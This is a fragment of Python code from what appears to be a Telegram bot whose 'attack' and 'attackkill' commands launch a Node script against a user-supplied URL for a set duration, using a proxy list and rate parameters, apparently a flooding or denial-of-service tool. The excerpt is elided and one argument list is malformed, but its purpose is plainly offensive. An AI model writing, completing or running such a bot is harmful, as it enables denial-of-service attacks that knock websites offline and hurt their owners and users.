...
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    # attack them —cache
    await start_attack(script, url, duration, '40', '5', 'proxy.txt', user_id, context, chat_id, ['--cache'])
...
async def attackkill(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    script = os.path.join(os.getcwd(), 's1.js')
    # attackkill them —cache
    await start_attack(script, url, duration, '100' '9', 'proxy.txt', user_id, context, chat_id, ['--cache'])
